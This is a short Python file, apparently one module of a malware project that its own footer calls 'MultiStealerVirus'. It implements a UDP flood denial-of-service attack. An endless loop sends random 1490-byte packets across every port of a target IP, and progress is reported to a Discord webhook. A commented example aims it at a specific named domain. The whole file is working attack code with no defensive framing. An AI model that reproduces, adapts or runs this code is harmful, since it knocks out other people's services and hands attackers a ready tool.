import random
import socket
from threading import Thread
from discord import SyncWebhook, File
import discord



class DoS:
    def __init__(self, webhook: str, ip: str, port: int=80):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.bytes = random._urandom(1490)

        self.ip = ip
        self.port = port
        self.webhook_url = webhook

        self.dos(self.ip, self.port)


    def dos(self, ip, port):
        sent = 0
        
        #if port >= 65534: port = 1

        while True:
            try:
                self.sock.sendto(self.bytes, (ip, port))
                sent += 1
                port += 1

                #print(Fore.CYAN + f"Packet number {sent} sent to {ip}:{port}" + Fore.RESET)

                if port == 65534:
                    port = 1
                    Thread(target=self.send_status, args=(sent, ip, port), daemon=True).start()
                elif port == 1900:
                    port = 1901

            except Exception as e:
                #print(e)
                pass
    

    def send_status(self, sent, ip, port):
        webhook = SyncWebhook.from_url(self.webhook_url)

        embed = discord.Embed(title="DoS", description=f"```Packet number {sent} sent to {ip}:{port}```", color=0x10131c)
        embed.set_footer(text="github.com/Josakko/MultiStealerVirus")
        webhook.send(embed=embed)


#max port - 65534

#if __name__ == "__main__":
#    import colorama
#    from colorama import Fore
#    colorama.init()
#    
#    DoS(webhook="https://discord.com/api/webhooks/ID/TOKEN", ip=socket.gethostbyname("prointegris.com"), port=80)
